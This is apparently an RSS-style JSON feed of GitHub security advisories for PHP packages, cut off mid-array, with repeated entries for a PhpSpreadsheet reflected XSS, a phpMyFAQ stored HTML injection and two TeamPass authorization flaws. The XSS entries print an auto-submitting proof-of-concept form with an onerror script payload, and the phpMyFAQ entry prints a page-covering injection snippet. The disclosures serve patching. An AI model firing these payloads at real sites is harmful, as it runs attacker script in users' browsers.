{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for PHP packages hosted at packagist.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Acomposer",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/composer.json",
    "description": "Security Advisory for PHP packages hosted at packagist.org on GitHub",
    "items": [
        {
            "content_html": "<h1 id=\"unauthorized-reflected-xss-in-convert-onlinephp-file\">Unauthorized Reflected XSS in <code>Convert-Online.php</code> file</h1>\n<p><strong>Product</strong>: Phpspreadsheet\n<strong>Version</strong>: version 3.6.0\n<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n<strong>CVSS vector v.3.1</strong>: 8.2 (AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N)\n<strong>CVSS vector v.4.0</strong>: 8.3 (AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:H/VA:N/SC:L/SI:H/SA:L)\n<strong>Description</strong>: using the <code>/vendor/phpoffice/phpspreadsheet/samples/Engineering/Convert-Online.php</code> script, an attacker can perform a XSS-type attack \n<strong>Impact</strong>: executing arbitrary JavaScript code in the browser\n<strong>Vulnerable component</strong>: the <code>/vendor/phpoffice/phpspreadsheet/samples/Engineering/Convert-Online.php</code> file\n<strong>Exploitation conditions</strong>: an unauthorized user\n<strong>Mitigation</strong>: sanitization of the quantity variable\n<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>\n<h1 id=\"research\">Research</h1>\n<p>The researcher discovered zero-day vulnerability Unauthorized Reflected Cross-Site Scripting (XSS) (in <code>Convert-Online.php</code> file) in Phpspreadsheet.</p>\n<p>There is no sanitization in the <code>/vendor/phpoffice/phpspreadsheet/samples/Engineering/Convert-Online.php</code> file, which leads to the possibility of a XSS attack.</p>\n<p><img alt=\"fig4\" src=\"https://github.com/user-attachments/assets/71a6ab8b-db65-4e7e-bb36-39f0bd0f7077\"></p>\n<p><em>Figure 4. The message with the quantity parameter is displayed without sanitization</em></p>\n<p>The following figure shows a POST HTTP-request and a response to the server with the variable quantity, which is displayed in the response from the server without sanitization.</p>\n<img src=\"https://github.com/user-attachments/assets/022323c9-ca1e-44ea-9380-37ed7848e971\" alt=\"fig5\" width=\"460\">\n\n<p><em>Figure 5. In the server's response , the quantity variable is displayed without sanitization</em></p>\n<p>An attacker can prepare a special HTML form that will be automatically sent to the vulnerable scenario.</p>\n<p><em>Listing 3. HTML form that demonstrates the exploitation of the XSS vulnerability</em></p>\n<pre><code>&lt;html&gt;\n  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;\n  &lt;body&gt;\n    &lt;form action=\"https://192.***.***.***/vendor/phpoffice/phpspreadsheet/samples/Engineering/Convert-Online.php\" method=\"POST\"&gt;\n      &lt;input type=\"hidden\" name=\"category\" value=\"Weight&amp;#32;and&amp;#32;Mass\" /&gt;\n      &lt;input type=\"hidden\" name=\"quantity\" value=\"1&amp;#46;0&amp;lt;img&amp;#32;src&amp;#61;1&amp;#32;onerror&amp;#61;alert&amp;#40;&amp;#41;&amp;gt;\" /&gt;\n      &lt;input type=\"hidden\" name=\"fromUnit\" value=\"g\" /&gt;\n      &lt;input type=\"hidden\" name=\"toUnit\" value=\"g\" /&gt;\n      &lt;input type=\"hidden\" name=\"submitx\" value=\"Convert\" /&gt;\n      &lt;input type=\"submit\" value=\"Submit request\" /&gt;\n    &lt;/form&gt;\n    &lt;script&gt;\n      history.pushState('', '', '/');\n      document.forms[0].submit();\n    &lt;/script&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n<p>After the user visits the attacker's resource, the form will be sent to the vulnerable scenario, which will lead to the execution of arbitrary code in the client's browser.</p>\n<img src=\"https://github.com/user-attachments/assets/e52b68c6-5a98-4db2-85ec-5bf37e4cb625\" alt=\"fig6\" width=\"389\">\n\n<p><em>Figure 6. Executing arbitrary JavaScript code</em></p>\n<h1 id=\"credit\">Credit</h1>\n<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-x88g-h956-m5xg\">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-x88g-h956-m5xg</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4\">https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x88g-h956-m5xg\">https://github.com/advisories/GHSA-x88g-h956-m5xg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x88g-h956-m5xg",
            "title": "[phpoffice/phpspreadsheet] Phpspreadsheet allows unauthorized Reflected XSS in `Convert-Online.php` file",
            "date_modified": "2025-01-03T16:05:27.000Z",
            "date_published": "2025-01-03T16:05:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x88g-h956-m5xg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"unauthorized-reflected-xss-in-convert-onlinephp-file\">Unauthorized Reflected XSS in <code>Convert-Online.php</code> file</h1>\n<p><strong>Product</strong>: Phpspreadsheet\n<strong>Version</strong>: version 3.6.0\n<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n<strong>CVSS vector v.3.1</strong>: 8.2 (AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N)\n<strong>CVSS vector v.4.0</strong>: 8.3 (AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:H/VA:N/SC:L/SI:H/SA:L)\n<strong>Description</strong>: using the <code>/vendor/phpoffice/phpspreadsheet/samples/Engineering/Convert-Online.php</code> script, an attacker can perform a XSS-type attack \n<strong>Impact</strong>: executing arbitrary JavaScript code in the browser\n<strong>Vulnerable component</strong>: the <code>/vendor/phpoffice/phpspreadsheet/samples/Engineering/Convert-Online.php</code> file\n<strong>Exploitation conditions</strong>: an unauthorized user\n<strong>Mitigation</strong>: sanitization of the quantity variable\n<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>\n<h1 id=\"research\">Research</h1>\n<p>The researcher discovered zero-day vulnerability Unauthorized Reflected Cross-Site Scripting (XSS) (in <code>Convert-Online.php</code> file) in Phpspreadsheet.</p>\n<p>There is no sanitization in the <code>/vendor/phpoffice/phpspreadsheet/samples/Engineering/Convert-Online.php</code> file, which leads to the possibility of a XSS attack.</p>\n<p><img alt=\"fig4\" src=\"https://github.com/user-attachments/assets/71a6ab8b-db65-4e7e-bb36-39f0bd0f7077\"></p>\n<p><em>Figure 4. The message with the quantity parameter is displayed without sanitization</em></p>\n<p>The following figure shows a POST HTTP-request and a response to the server with the variable quantity, which is displayed in the response from the server without sanitization.</p>\n<img src=\"https://github.com/user-attachments/assets/022323c9-ca1e-44ea-9380-37ed7848e971\" alt=\"fig5\" width=\"460\">\n\n<p><em>Figure 5. In the server's response , the quantity variable is displayed without sanitization</em></p>\n<p>An attacker can prepare a special HTML form that will be automatically sent to the vulnerable scenario.</p>\n<p><em>Listing 3. HTML form that demonstrates the exploitation of the XSS vulnerability</em></p>\n<pre><code>&lt;html&gt;\n  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;\n  &lt;body&gt;\n    &lt;form action=\"https://192.***.***.***/vendor/phpoffice/phpspreadsheet/samples/Engineering/Convert-Online.php\" method=\"POST\"&gt;\n      &lt;input type=\"hidden\" name=\"category\" value=\"Weight&amp;#32;and&amp;#32;Mass\" /&gt;\n      &lt;input type=\"hidden\" name=\"quantity\" value=\"1&amp;#46;0&amp;lt;img&amp;#32;src&amp;#61;1&amp;#32;onerror&amp;#61;alert&amp;#40;&amp;#41;&amp;gt;\" /&gt;\n      &lt;input type=\"hidden\" name=\"fromUnit\" value=\"g\" /&gt;\n      &lt;input type=\"hidden\" name=\"toUnit\" value=\"g\" /&gt;\n      &lt;input type=\"hidden\" name=\"submitx\" value=\"Convert\" /&gt;\n      &lt;input type=\"submit\" value=\"Submit request\" /&gt;\n    &lt;/form&gt;\n    &lt;script&gt;\n      history.pushState('', '', '/');\n      document.forms[0].submit();\n    &lt;/script&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n<p>After the user visits the attacker's resource, the form will be sent to the vulnerable scenario, which will lead to the execution of arbitrary code in the client's browser.</p>\n<img src=\"https://github.com/user-attachments/assets/e52b68c6-5a98-4db2-85ec-5bf37e4cb625\" alt=\"fig6\" width=\"389\">\n\n<p><em>Figure 6. Executing arbitrary JavaScript code</em></p>\n<h1 id=\"credit\">Credit</h1>\n<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-x88g-h956-m5xg\">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-x88g-h956-m5xg</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4\">https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x88g-h956-m5xg\">https://github.com/advisories/GHSA-x88g-h956-m5xg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x88g-h956-m5xg",
            "title": "[phpoffice/phpspreadsheet] Phpspreadsheet allows unauthorized Reflected XSS in `Convert-Online.php` file",
            "date_modified": "2025-01-03T16:05:27.000Z",
            "date_published": "2025-01-03T16:05:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x88g-h956-m5xg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"unauthorized-reflected-xss-in-convert-onlinephp-file\">Unauthorized Reflected XSS in <code>Convert-Online.php</code> file</h1>\n<p><strong>Product</strong>: Phpspreadsheet\n<strong>Version</strong>: version 3.6.0\n<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n<strong>CVSS vector v.3.1</strong>: 8.2 (AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N)\n<strong>CVSS vector v.4.0</strong>: 8.3 (AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:H/VA:N/SC:L/SI:H/SA:L)\n<strong>Description</strong>: using the <code>/vendor/phpoffice/phpspreadsheet/samples/Engineering/Convert-Online.php</code> script, an attacker can perform a XSS-type attack \n<strong>Impact</strong>: executing arbitrary JavaScript code in the browser\n<strong>Vulnerable component</strong>: the <code>/vendor/phpoffice/phpspreadsheet/samples/Engineering/Convert-Online.php</code> file\n<strong>Exploitation conditions</strong>: an unauthorized user\n<strong>Mitigation</strong>: sanitization of the quantity variable\n<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>\n<h1 id=\"research\">Research</h1>\n<p>The researcher discovered zero-day vulnerability Unauthorized Reflected Cross-Site Scripting (XSS) (in <code>Convert-Online.php</code> file) in Phpspreadsheet.</p>\n<p>There is no sanitization in the <code>/vendor/phpoffice/phpspreadsheet/samples/Engineering/Convert-Online.php</code> file, which leads to the possibility of a XSS attack.</p>\n<p><img alt=\"fig4\" src=\"https://github.com/user-attachments/assets/71a6ab8b-db65-4e7e-bb36-39f0bd0f7077\"></p>\n<p><em>Figure 4. The message with the quantity parameter is displayed without sanitization</em></p>\n<p>The following figure shows a POST HTTP-request and a response to the server with the variable quantity, which is displayed in the response from the server without sanitization.</p>\n<img src=\"https://github.com/user-attachments/assets/022323c9-ca1e-44ea-9380-37ed7848e971\" alt=\"fig5\" width=\"460\">\n\n<p><em>Figure 5. In the server's response , the quantity variable is displayed without sanitization</em></p>\n<p>An attacker can prepare a special HTML form that will be automatically sent to the vulnerable scenario.</p>\n<p><em>Listing 3. HTML form that demonstrates the exploitation of the XSS vulnerability</em></p>\n<pre><code>&lt;html&gt;\n  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;\n  &lt;body&gt;\n    &lt;form action=\"https://192.***.***.***/vendor/phpoffice/phpspreadsheet/samples/Engineering/Convert-Online.php\" method=\"POST\"&gt;\n      &lt;input type=\"hidden\" name=\"category\" value=\"Weight&amp;#32;and&amp;#32;Mass\" /&gt;\n      &lt;input type=\"hidden\" name=\"quantity\" value=\"1&amp;#46;0&amp;lt;img&amp;#32;src&amp;#61;1&amp;#32;onerror&amp;#61;alert&amp;#40;&amp;#41;&amp;gt;\" /&gt;\n      &lt;input type=\"hidden\" name=\"fromUnit\" value=\"g\" /&gt;\n      &lt;input type=\"hidden\" name=\"toUnit\" value=\"g\" /&gt;\n      &lt;input type=\"hidden\" name=\"submitx\" value=\"Convert\" /&gt;\n      &lt;input type=\"submit\" value=\"Submit request\" /&gt;\n    &lt;/form&gt;\n    &lt;script&gt;\n      history.pushState('', '', '/');\n      document.forms[0].submit();\n    &lt;/script&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n<p>After the user visits the attacker's resource, the form will be sent to the vulnerable scenario, which will lead to the execution of arbitrary code in the client's browser.</p>\n<img src=\"https://github.com/user-attachments/assets/e52b68c6-5a98-4db2-85ec-5bf37e4cb625\" alt=\"fig6\" width=\"389\">\n\n<p><em>Figure 6. Executing arbitrary JavaScript code</em></p>\n<h1 id=\"credit\">Credit</h1>\n<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-x88g-h956-m5xg\">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-x88g-h956-m5xg</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4\">https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x88g-h956-m5xg\">https://github.com/advisories/GHSA-x88g-h956-m5xg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x88g-h956-m5xg",
            "title": "[phpoffice/phpspreadsheet] Phpspreadsheet allows unauthorized Reflected XSS in `Convert-Online.php` file",
            "date_modified": "2025-01-03T16:05:27.000Z",
            "date_published": "2025-01-03T16:05:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x88g-h956-m5xg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"unauthorized-reflected-xss-in-convert-onlinephp-file\">Unauthorized Reflected XSS in <code>Convert-Online.php</code> file</h1>\n<p><strong>Product</strong>: Phpspreadsheet\n<strong>Version</strong>: version 3.6.0\n<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n<strong>CVSS vector v.3.1</strong>: 8.2 (AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N)\n<strong>CVSS vector v.4.0</strong>: 8.3 (AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:H/VA:N/SC:L/SI:H/SA:L)\n<strong>Description</strong>: using the <code>/vendor/phpoffice/phpspreadsheet/samples/Engineering/Convert-Online.php</code> script, an attacker can perform a XSS-type attack \n<strong>Impact</strong>: executing arbitrary JavaScript code in the browser\n<strong>Vulnerable component</strong>: the <code>/vendor/phpoffice/phpspreadsheet/samples/Engineering/Convert-Online.php</code> file\n<strong>Exploitation conditions</strong>: an unauthorized user\n<strong>Mitigation</strong>: sanitization of the quantity variable\n<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>\n<h1 id=\"research\">Research</h1>\n<p>The researcher discovered zero-day vulnerability Unauthorized Reflected Cross-Site Scripting (XSS) (in <code>Convert-Online.php</code> file) in Phpspreadsheet.</p>\n<p>There is no sanitization in the <code>/vendor/phpoffice/phpspreadsheet/samples/Engineering/Convert-Online.php</code> file, which leads to the possibility of a XSS attack.</p>\n<p><img alt=\"fig4\" src=\"https://github.com/user-attachments/assets/71a6ab8b-db65-4e7e-bb36-39f0bd0f7077\"></p>\n<p><em>Figure 4. The message with the quantity parameter is displayed without sanitization</em></p>\n<p>The following figure shows a POST HTTP-request and a response to the server with the variable quantity, which is displayed in the response from the server without sanitization.</p>\n<img src=\"https://github.com/user-attachments/assets/022323c9-ca1e-44ea-9380-37ed7848e971\" alt=\"fig5\" width=\"460\">\n\n<p><em>Figure 5. In the server's response , the quantity variable is displayed without sanitization</em></p>\n<p>An attacker can prepare a special HTML form that will be automatically sent to the vulnerable scenario.</p>\n<p><em>Listing 3. HTML form that demonstrates the exploitation of the XSS vulnerability</em></p>\n<pre><code>&lt;html&gt;\n  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;\n  &lt;body&gt;\n    &lt;form action=\"https://192.***.***.***/vendor/phpoffice/phpspreadsheet/samples/Engineering/Convert-Online.php\" method=\"POST\"&gt;\n      &lt;input type=\"hidden\" name=\"category\" value=\"Weight&amp;#32;and&amp;#32;Mass\" /&gt;\n      &lt;input type=\"hidden\" name=\"quantity\" value=\"1&amp;#46;0&amp;lt;img&amp;#32;src&amp;#61;1&amp;#32;onerror&amp;#61;alert&amp;#40;&amp;#41;&amp;gt;\" /&gt;\n      &lt;input type=\"hidden\" name=\"fromUnit\" value=\"g\" /&gt;\n      &lt;input type=\"hidden\" name=\"toUnit\" value=\"g\" /&gt;\n      &lt;input type=\"hidden\" name=\"submitx\" value=\"Convert\" /&gt;\n      &lt;input type=\"submit\" value=\"Submit request\" /&gt;\n    &lt;/form&gt;\n    &lt;script&gt;\n      history.pushState('', '', '/');\n      document.forms[0].submit();\n    &lt;/script&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n<p>After the user visits the attacker's resource, the form will be sent to the vulnerable scenario, which will lead to the execution of arbitrary code in the client's browser.</p>\n<img src=\"https://github.com/user-attachments/assets/e52b68c6-5a98-4db2-85ec-5bf37e4cb625\" alt=\"fig6\" width=\"389\">\n\n<p><em>Figure 6. Executing arbitrary JavaScript code</em></p>\n<h1 id=\"credit\">Credit</h1>\n<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-x88g-h956-m5xg\">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-x88g-h956-m5xg</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4\">https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x88g-h956-m5xg\">https://github.com/advisories/GHSA-x88g-h956-m5xg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x88g-h956-m5xg",
            "title": "[phpoffice/phpspreadsheet] Phpspreadsheet allows unauthorized Reflected XSS in `Convert-Online.php` file",
            "date_modified": "2025-01-03T16:05:27.000Z",
            "date_published": "2025-01-03T16:05:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x88g-h956-m5xg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Due to insufficient validation on the content of new FAQ posts, it is possible for authenticated users to inject malicious HTML or JavaScript code that can impact other users viewing the FAQ. This vulnerability arises when user-provided inputs in FAQ entries are not sanitized or escaped before being rendered on the page.</p>\n<h3 id=\"details\">Details</h3>\n<p>An attacker can inject malicious HTML content into the FAQ editor at <a href=\"http://localhost/admin/index.php?action=editentry\">http://localhost/admin/index.php?action=editentry</a>, resulting in a complete disruption of the FAQ page's user interface. By injecting malformed HTML elements styled to cover the entire screen, an attacker can render the page unusable. This injection manipulates the page structure by introducing overlapping buttons, images, and iframes, breaking the intended layout and functionality. </p>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>In the source code of a FAQ Q&amp;A post, insert the likes of this snippet:</li>\n</ol>\n<pre><code>&lt;p&gt;&amp;lt;--`&lt;img src=\"&amp;#96;\"&gt; --!&amp;gt;&lt;/p&gt;\n&lt;div style=\"position: absolute; top: 0; left: 0; width: 100%; height: 100%;\"&gt;&lt;form&gt;&lt;button&gt;HTML INJECTION 1&lt;img&gt; &lt;img&gt; &lt;img&gt; &lt;img&gt; &lt;iframe&gt;&lt;/iframe&gt;&lt;/button&gt;\n&lt;div style=\"xg-p: absolute; top: 0; left: 0; width: 100%; height: 100%;\"&gt;x&lt;/div&gt;\n&lt;button&gt;HTML INJECTION 2&lt;iframe&gt;&lt;/iframe&gt; &lt;iframe&gt;&lt;/iframe&gt; &lt;/button&gt;&lt;/form&gt;&lt;/div&gt;\n</code></pre>\n<p><img alt=\"image\" src=\"https://github.com/user-attachments/assets/7c12ff40-1978-4dee-b501-c48f3ea2b9ba\">\n2. A normal user would see the broken FAQ page, or otherwise manipulated by the attacker to present a different malicious page:\n<img alt=\"image\" src=\"https://github.com/user-attachments/assets/4b815663-4836-4370-8b02-5b01bce71b0c\"></p>\n<p>A demo (fresh install overwrites every 24hours) here: <a href=\"https://roy.demo.phpmyfaq.de/content/1/24/en/24.html\">https://roy.demo.phpmyfaq.de/content/1/24/en/24.html</a>?</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Exploiting this issue can lead to Denial of Service for legitimate users, damage to the user experience, and potential abuse in phishing or defacement attacks. </p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-ww33-jppq-qfrp\">https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-ww33-jppq-qfrp</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-56199\">https://nvd.nist.gov/vuln/detail/CVE-2024-56199</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-ww33-jppq-qfrp\">https://github.com/advisories/GHSA-ww33-jppq-qfrp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-ww33-jppq-qfrp",
            "title": "[thorsten/phpmyfaq] phpMyFAQ Vulnerable to Stored HTML Injection at FAQ",
            "date_modified": "2025-01-02T22:43:41.000Z",
            "date_published": "2025-01-02T22:43:40.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-ww33-jppq-qfrp"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Due to insufficient validation on the content of new FAQ posts, it is possible for authenticated users to inject malicious HTML or JavaScript code that can impact other users viewing the FAQ. This vulnerability arises when user-provided inputs in FAQ entries are not sanitized or escaped before being rendered on the page.</p>\n<h3 id=\"details\">Details</h3>\n<p>An attacker can inject malicious HTML content into the FAQ editor at <a href=\"http://localhost/admin/index.php?action=editentry\">http://localhost/admin/index.php?action=editentry</a>, resulting in a complete disruption of the FAQ page's user interface. By injecting malformed HTML elements styled to cover the entire screen, an attacker can render the page unusable. This injection manipulates the page structure by introducing overlapping buttons, images, and iframes, breaking the intended layout and functionality. </p>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>In the source code of a FAQ Q&amp;A post, insert the likes of this snippet:</li>\n</ol>\n<pre><code>&lt;p&gt;&amp;lt;--`&lt;img src=\"&amp;#96;\"&gt; --!&amp;gt;&lt;/p&gt;\n&lt;div style=\"position: absolute; top: 0; left: 0; width: 100%; height: 100%;\"&gt;&lt;form&gt;&lt;button&gt;HTML INJECTION 1&lt;img&gt; &lt;img&gt; &lt;img&gt; &lt;img&gt; &lt;iframe&gt;&lt;/iframe&gt;&lt;/button&gt;\n&lt;div style=\"xg-p: absolute; top: 0; left: 0; width: 100%; height: 100%;\"&gt;x&lt;/div&gt;\n&lt;button&gt;HTML INJECTION 2&lt;iframe&gt;&lt;/iframe&gt; &lt;iframe&gt;&lt;/iframe&gt; &lt;/button&gt;&lt;/form&gt;&lt;/div&gt;\n</code></pre>\n<p><img alt=\"image\" src=\"https://github.com/user-attachments/assets/7c12ff40-1978-4dee-b501-c48f3ea2b9ba\">\n2. A normal user would see the broken FAQ page, or otherwise manipulated by the attacker to present a different malicious page:\n<img alt=\"image\" src=\"https://github.com/user-attachments/assets/4b815663-4836-4370-8b02-5b01bce71b0c\"></p>\n<p>A demo (fresh install overwrites every 24hours) here: <a href=\"https://roy.demo.phpmyfaq.de/content/1/24/en/24.html\">https://roy.demo.phpmyfaq.de/content/1/24/en/24.html</a>?</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Exploiting this issue can lead to Denial of Service for legitimate users, damage to the user experience, and potential abuse in phishing or defacement attacks. </p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-ww33-jppq-qfrp\">https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-ww33-jppq-qfrp</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-56199\">https://nvd.nist.gov/vuln/detail/CVE-2024-56199</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-ww33-jppq-qfrp\">https://github.com/advisories/GHSA-ww33-jppq-qfrp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-ww33-jppq-qfrp",
            "title": "[phpmyfaq/phpmyfaq] phpMyFAQ Vulnerable to Stored HTML Injection at FAQ",
            "date_modified": "2025-01-02T22:43:41.000Z",
            "date_published": "2025-01-02T22:43:40.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-ww33-jppq-qfrp"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>TeamPass before 3.1.3.1 does not properly prevent a user from acting with the privileges of a different user_id.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-50703\">https://nvd.nist.gov/vuln/detail/CVE-2024-50703</a></li>\n<li><a href=\"https://github.com/nilsteampassnet/TeamPass/commit/c7f7f809071eaa9e04505ee79cec7049a42959e9\">https://github.com/nilsteampassnet/TeamPass/commit/c7f7f809071eaa9e04505ee79cec7049a42959e9</a></li>\n<li><a href=\"https://github.com/nilsteampassnet/TeamPass/compare/3.1.2...3.1.3.1\">https://github.com/nilsteampassnet/TeamPass/compare/3.1.2...3.1.3.1</a></li>\n<li><a href=\"https://github.com/nilsteampassnet/TeamPass/compare/3.1.3...3.1.3.1\">https://github.com/nilsteampassnet/TeamPass/compare/3.1.3...3.1.3.1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9wmc-988h-2mv2\">https://github.com/advisories/GHSA-9wmc-988h-2mv2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9wmc-988h-2mv2",
            "title": "[nilsteampassnet/teampass] TeamPass privileges issue",
            "date_modified": "2024-12-30T18:45:43.000Z",
            "date_published": "2024-12-30T15:31:59.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9wmc-988h-2mv2"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>TeamPass before 3.1.3.1 does not properly check whether a mail_me (aka action_mail) operation is on behalf of an administrator or manager.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-50702\">https://nvd.nist.gov/vuln/detail/CVE-2024-50702</a></li>\n<li><a href=\"https://github.com/nilsteampassnet/TeamPass/commit/35e2b479f2379545b4132bc30a9d052ba7018bf9\">https://github.com/nilsteampassnet/TeamPass/commit/35e2b479f2379545b4132bc30a9d052ba7018bf9</a></li>\n<li><a href=\"https://github.com/nilsteampassnet/TeamPass/compare/3.1.2...3.1.3.1\">https://github.com/nilsteampassnet/TeamPass/compare/3.1.2...3.1.3.1</a></li>\n<li><a href=\"https://github.com/nilsteampassnet/TeamPass/compare/3.1.3...3.1.3.1\">https://github.com/nilsteampassnet/TeamPass/compare/3.1.3...3.1.3.1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7rm3-4w6j-8xx4\">https://github.com/advisories/GHSA-7rm3-4w6j-8xx4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7rm3-4w6j-8xx4",
            "title": "[nilsteampassnet/teampass] TeamPass mail_me operation authorization issue",
            "date_modified": "2024-12-30T18:45:35.000Z",
            "date_published": "2024-12-30T15:31:59.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7rm3-4w6j-8xx4"
            },
            "tags": [
                "severity"
            ]
        },
        {
